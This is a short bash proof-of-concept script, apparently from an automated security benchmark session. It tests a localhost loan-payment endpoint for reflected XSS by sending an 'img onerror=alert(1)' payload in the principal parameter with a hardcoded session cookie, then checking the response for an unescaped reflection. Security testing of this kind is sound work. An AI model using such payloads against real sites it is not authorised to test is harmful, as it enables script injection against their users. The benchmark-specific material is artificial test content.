#!/bin/bash
# POC: Demonstrates Reflected XSS vulnerability in /total_loan_payments endpoint by injecting unescaped HTML/JavaScript payload in principal parameter
# Target: ./repo
# Created: 2025-12-02T16:27:24.487Z
# Session: benchmark-XBEN-104-24-mioryccy

# XSS POC for /total_loan_payments endpoint
# Tests for reflected XSS in principal parameter

TARGET_URL="http://localhost:8080"
SESSION_COOKIE="session=eyJ1c2VyX2lkIjoxfQ.aS8RzQ.tNryOSP5qryCamiD-ECEPNA-JVM"

echo "[*] Testing Reflected XSS in /total_loan_payments endpoint"
echo "[*] Target: ${TARGET_URL}/total_loan_payments"
echo ""

# Test 1: Basic XSS payload with img tag
echo "[Test 1] Injecting img tag with onerror event handler"
PAYLOAD='<img src=x onerror=alert(1)>'
ENCODED_PAYLOAD=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$PAYLOAD'''))")

echo "[*] Payload: ${PAYLOAD}"
echo "[*] Encoded: ${ENCODED_PAYLOAD}"
echo ""

RESPONSE=$(curl -s "${TARGET_URL}/total_loan_payments?principal=${ENCODED_PAYLOAD}&payment=100&term=60" -b "${SESSION_COOKIE}")

echo "[*] Response:"
echo "${RESPONSE}" | python3 -m json.tool 2>/dev/null || echo "${RESPONSE}"
echo ""

# Check if payload is reflected unescaped
if echo "${RESPONSE}" | grep -q "<img src=x onerror=alert(1)>"; then
    echo "[+] VULNERABLE: Payload reflected unescaped in response!"
    echo "[+] The img tag with onerror handler is present in the JSON response"
    exit 0
else
    echo "[-] Payload not found in response or properly escaped"
    exit 1
fi